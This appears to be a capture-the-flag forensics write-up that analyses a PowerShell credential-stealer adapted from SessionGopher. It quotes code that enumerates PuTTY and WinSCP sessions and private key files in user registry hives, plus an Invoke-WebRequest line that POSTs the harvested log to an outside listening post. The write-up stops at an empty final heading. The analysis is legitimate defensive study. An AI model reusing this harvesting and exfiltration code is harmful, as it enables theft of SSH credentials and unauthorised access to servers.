### First Insights

At this point in the investigation we now know that we had a malicious script execute on an employee's machine. Now that we have discovered the script, we need to examine the code being executed to determine what data the malware stole from the machine and sent to the LP. This will require a full breakdown of the malware and examination of files that the script accessed. This task attached an artifacts.zip, which contained multiple PuTTY and WinSCP keys and the employee's NTUSER.dat file. With these given files, along with the malware script, we have a good route to determine the extent of the breach.

### Malware Examination

Our first step to find the comprimised OOPS account is to examine the malware. The entire script is included in this task's directory, but we will be using snippits of it.
After the inital function declarations, we see that there is a global log that is being sent back to the listning post and the Invoke-SessionGopher function is called. We will start there.

```
function Invoke-SessionGopher {
  # Value for HKEY_USERS hive
  $HKU = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $HKLM = 2147483650

  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"


  Write-Log "Digging on $(Hostname)..."

  # Aggregate all user hives in HKEY_USERS into a variable
  $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

  # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
  foreach($Hive in $UserHives) {

    # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information.
    $UserObject = New-Object PSObject

    $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
    $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
    $ArrayOfPPKFiles = New-Object System.Collections.ArrayList

    $objUser = (GetMappedSID)
    $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)

    $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value

    # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
    $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
    $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"

    if (Test-Path $WinSCPPath) {

      # Aggregates all saved sessions from that user's WinSCP client
      $AllWinSCPSessions = Get-ChildItem $WinSCPPath

      (ProcessWinSCPLocal $AllWinSCPSessions)

    } # If (Test-Path WinSCPPath)

    if (Test-Path $PuTTYPath) {

      # Store .ppk files
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList

      # Aggregates all saved sessions from that user's PuTTY client
      $AllPuTTYSessions = Get-ChildItem $PuTTYPath

      (ProcessPuTTYLocal $AllPuTTYSessions)

      (ProcessPPKFile $PPKExtensionFilesINodes)

    } # If (Test-Path PuTTYPath)

  } # For each Hive in UserHives

  Write-Host "Final log:"
  $global:log
```
This function acts as the "main" of the script. It gives away what data the malware is attempting to dig in the declarations of *$PuTTYPathEnding* and *$WinSCPPathEnding*. These tell us that the malware is attempting to look for stored data about the machine's PuTTY and WinSCP sessions. The malware then looks in the Windows User Registry for all past and current users on the machine. After collecting all of the users, the script calls two methods, *ProcessWinSCPLocal* and *ProcessPuTTYLocal*. This confirms that the malware is digging for ssh credentials. We will now look at the *ProcessPuTTYLocal* method.

```
function ProcessPuTTYLocal($AllPuTTYSessions) {

  # For each PuTTY saved session, extract the information we want
  foreach($Session in $AllPuTTYSessions) {

    $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname,Keyfile

    $PuTTYSessionObject.Source = $Source
    $PuTTYSessionObject.Session = (Split-Path $Session -Leaf)
    $PuTTYSessionObject.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $PuTTYSessionObject.Keyfile = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "PublicKeyFile" -ErrorAction SilentlyContinue).PublicKeyFile)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)

    # Grab keyfile inode and add it to the array if it's a ppk
    $Dirs = Get-ChildItem $PuTTYSessionObject.Keyfile -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
        }
      }
  }

  if ($o) {
    $ArrayOfPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Log "PuTTY Sessions"
    Write-Log ($ArrayOfPuTTYSessions | Format-List | Out-String)
  }

  # Add the array of PuTTY session objects to UserObject
  $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions

} # ProcessPuTTYLocal
```
This is the one of the bulk digging functions of the malware. This method looks at each PuTTY session store in the Registry and extracts two values, *HostName* and *PublicKeyFile*. These two values are exactly what the malware needs to be able to get into a machine, as long as the Public Key file is non-encrypted. From all of the parsed keyfiles in the registry the malware then searches the machine for the matching key files and saves them to the global log as a .csv. The other digging method looks for WinSCP sessions and does the same thing. After the registry and key files are parsed, the malware then makes it POST request to the LP.

```
Invoke-WebRequest -uri http://rlwmw.invalid:8080 -Method Post -Body $global:log
```
Now knowing that the malware is searching for unsecure keys stored on the machine, we must look at the included NTUSER registry file to see if any keys are not encrypted.

### Understand Windows Registry

The first step to examine the Registry is to know how to open the file. After research, I was able to load the hive onto my machine and was ready to see what the malware touched. Following the path in the malware, I was albe to see that there was a decent amount of files that the malware examined. 

```
$PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
$WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
```

![image](https://user-images.githubusercontent.com/94944325/145702185-36260c1c-2458-4dc1-99ce-eb84cb5d11fb.png)

Looking into the registry, we were able to narrow down the list of keys we needed to find that could be unencrypted.
![image](https://user-images.githubusercontent.com/94944325/145702220-e11866e9-264f-4a22-8ace-248b463eba21.png)
![image](https://user-images.githubusercontent.com/94944325/145702234-fc112f06-a083-4d61-a894-afe4fc4ad68d.png)


### Determine Comprimise
